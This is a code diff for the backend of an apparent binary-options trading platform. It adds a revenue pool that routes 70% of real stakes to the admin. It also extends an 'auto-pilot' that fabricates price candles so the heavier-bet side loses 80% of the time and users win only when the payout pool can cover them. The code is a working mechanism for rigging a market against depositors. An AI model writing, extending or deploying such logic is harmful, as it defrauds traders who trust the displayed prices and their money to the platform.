@@ -42,8 +42,36 @@ const MAX_CANDLES = 5000; // Added to prevent undefined error in array shift
 const SMART_AUTO_PILOT = true; 
 const ADMIN_WIN_RATIO = 0.80;  // 80% Win Rate for Admin
 
+// 🔥 GLOBAL REVENUE POOL SETTINGS 🔥
+const POOL_CONFIG = {
+    ADMIN_SHARE: 0.70, // 70% to Admin
+    USER_SHARE: 0.30   // 30% to Payout Pool
+};
+let globalPayoutPool = 0;
+let globalAdminProfit = 0;
+
 const markets = {}; 
 const activeTradesDb = {}; 
+
+// Sync Global Pool from Firebase
+db.ref('admin/revenue_pool').on('value', (snapshot) => {
+    const data = snapshot.val() || {};
+    globalPayoutPool = parseFloat(data.payoutPool) || 0;
+    globalAdminProfit = parseFloat(data.adminProfit) || 0;
+});
+
+function updateGlobalPoolInDB(payoutChange, adminChange) {
+    globalPayoutPool += payoutChange;
+    globalAdminProfit += adminChange;
+    
+    // Ensure pools don't drop below 0
+    if (globalPayoutPool < 0) globalPayoutPool = 0;
+    
+    db.ref('admin/revenue_pool').update({
+        payoutPool: globalPayoutPool,
+        adminProfit: globalAdminProfit
+    }).catch(err => console.error("Pool Update Error:", err));
+}
 
 function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
 function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }
@@ -177,14 +205,36 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
         if (!newCandle && SMART_AUTO_PILOT) {
             const trades = activeTradesDb[marketData.marketId] || {};
             let immediateUpVol = 0, immediateDownVol = 0;
+            let immediateUpPayout = 0, immediateDownPayout = 0;
             let futureUpVol = 0, futureDownVol = 0;
             const nextPeriod = currentPeriod + TIMEFRAME;
             
             Object.values(trades).forEach(t => {
+                const isDemo = t.isDemo === true; 
+                const payoutRate = t.payoutRate || 1.85;
+                const expectedPayout = t.amount * payoutRate;
+
+                // Process Real Trades Only for Pool Calculation
+                if (!isDemo && !t.isProcessedForPool) {
+                    const adminCut = t.amount * POOL_CONFIG.ADMIN_SHARE;
+                    const userCut = t.amount * POOL_CONFIG.USER_SHARE;
+                    updateGlobalPoolInDB(userCut, adminCut);
+                    
+                    // Mark as processed so we don't calculate the same trade twice
+                    t.isProcessedForPool = true;
+                    db.ref(`admin/markets/${marketData.marketId}/activeTrades/${t.id}/isProcessedForPool`).set(true).catch(()=>{});
+                }
+
                 // Check if trade expires at the end of this upcoming candle (Immediate Threat)
                 if (t.expiryTimestamp && t.expiryTimestamp <= nextPeriod + 2000) {
-                    if (t.direction === 'UP') immediateUpVol += t.amount;
-                    if (t.direction === 'DOWN') immediateDownVol += t.amount;
+                    if (t.direction === 'UP') {
+                        immediateUpVol += t.amount;
+                        if (!isDemo) immediateUpPayout += expectedPayout;
+                    }
+                    if (t.direction === 'DOWN') {
+                        immediateDownVol += t.amount;
+                        if (!isDemo) immediateDownPayout += expectedPayout;
+                    }
                 } else {
                     // Trades expiring in the future (Drift / Safety Zone calculation)
                     if (t.direction === 'UP') futureUpVol += t.amount;
@@ -192,14 +242,44 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
                 }
             });
 
-            // Rule 1: Conflict Resolution - Immediate Expiry has absolute priority
+            // Rule 1: Conflict Resolution - Real Payout Pool Check
             if (immediateUpVol > 0 || immediateDownVol > 0) {
-                if (Math.random() < ADMIN_WIN_RATIO) {
-                    const targetDirection = immediateUpVol > immediateDownVol ? 'RED' : 'GREEN';
-                    newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
-                    newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00005);
-                    console.log(`[AUTO-PILOT IMMEDIATE] ${marketData.marketId} -> U:${immediateUpVol} D:${immediateDownVol}. Forcing ${targetDirection}`);
+                let targetDirection = 'DOJI';
+
+                // Check if UP wins, can we pay?
+                const canAffordUp = immediateUpPayout <= globalPayoutPool;
+                // Check if DOWN wins, can we pay?
+                const canAffordDown = immediateDownPayout <= globalPayoutPool;
+
+                if (!canAffordUp && !canAffordDown) {
+                    // Disaster Scenario: Cannot afford either side (very rare). Force the lesser loss.
+                    targetDirection = immediateUpPayout > immediateDownPayout ? 'RED' : 'GREEN';
+                } else if (!canAffordUp) {
+                    // Cannot afford UP win, MUST close DOWN
+                    targetDirection = 'RED';
+                } else if (!canAffordDown) {
+                    // Cannot afford DOWN win, MUST close UP
+                    targetDirection = 'GREEN';
+                } else {
+                    // Can afford both. Let's apply standard logic. Force larger volume to lose 80% of the time.
+                    if (Math.random() < ADMIN_WIN_RATIO) {
+                        targetDirection = immediateUpVol > immediateDownVol ? 'RED' : 'GREEN';
+                    } else {
+                        // Let the users win naturally
+                        targetDirection = immediateUpVol > immediateDownVol ? 'GREEN' : 'RED';
+                    }
                 }
+
+                newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
+                newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00005);
+                
+                // Deduct payout from pool instantly if users are about to win
+                const finalWinningPayout = targetDirection === 'GREEN' ? immediateUpPayout : (targetDirection === 'RED' ? immediateDownPayout : 0);
+                if (finalWinningPayout > 0) {
+                    updateGlobalPoolInDB(-finalWinningPayout, 0); // Remove winning amount from pool
+                }
+
+                console.log(`[AUTO-PILOT IMMEDIATE] Pool: $${globalPayoutPool.toFixed(2)}. U-Pay: $${immediateUpPayout} D-Pay: $${immediateDownPayout}. Forcing ${targetDirection}`);
             } 
             // Rule 2: Continuous Safety Drift - No immediate threat, shift to safety for future trades
             else if (futureUpVol > 0 || futureDownVol > 0) {
@@ -223,7 +303,7 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
 
                 newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, driftCommand);
                 newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00005);
-                console.log(`[AUTO-PILOT DRIFT] ${marketData.marketId} -> Future U:${futureUpVol} D:${futureDownVol}. Drifting ${driftTarget} via ${driftCommand}`);
+                console.log(`[AUTO-PILOT DRIFT] Future U:${futureUpVol} D:${futureDownVol}. Drifting ${driftTarget} via ${driftCommand}`);
             }
         }
         
